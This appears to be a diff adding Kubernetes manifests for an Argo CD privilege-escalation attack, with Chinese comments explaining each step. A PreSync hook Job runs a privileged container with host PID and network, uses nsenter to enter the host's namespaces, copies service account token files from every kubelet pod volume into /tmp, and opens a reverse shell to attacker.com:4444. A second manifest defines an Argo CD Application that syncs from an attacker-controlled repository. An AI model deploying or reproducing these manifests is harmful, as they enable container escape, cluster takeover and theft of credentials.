@@ -1,0 +1,56 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: privesc-hook
+  namespace: default
+  annotations:
+    argocd.argoproj.io/hook: PreSync
+    argocd.argoproj.io/hook-delete-policy: HookSucceeded
+spec:
+  template:
+    spec:
+      hostPID: true           # 共享宿主机 PID 命名空间
+      hostNetwork: true       # 共享宿主机网络
+      tolerations:
+      - operator: Exists      # 在所有节点运行
+      containers:
+      - name: escape
+        image: ubuntu:latest
+        command:
+        - nsenter
+        - "--target"
+        - "1"                 # 宿主机 init 进程
+        - "--mount"
+        - "--uts"
+        - "--ipc"
+        - "--net"
+        - "--pid"
+        - "--"
+        - bash
+        - -c
+        - |
+          # 此时已在宿主机命名空间中
+          # 读取所有 K8s secrets
+          cat /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token > /tmp/tokens
+          # 或反弹 shell
+          bash -i >& /dev/tcp/attacker.com/4444 0>&1
+        securityContext:
+          privileged: true    # 特权容器
+      restartPolicy: Never
+      serviceAccountName: default
+
+---------------------------------------------------------
+apiVersion: argoproj.io/v1alpha1
+kind: Application
+metadata:
+  name: privesc-app
+  namespace: argocd
+spec:
+  project: default  # 默认项目允许任意目标
+  source:
+    repoURL: https://github.com/attacker/privesc-repo
+    targetRevision: HEAD
+    path: hack/
+  destination:
+    server: https://kubernetes.default.svc  # 或指定 EKS 集群
+    namespace: default
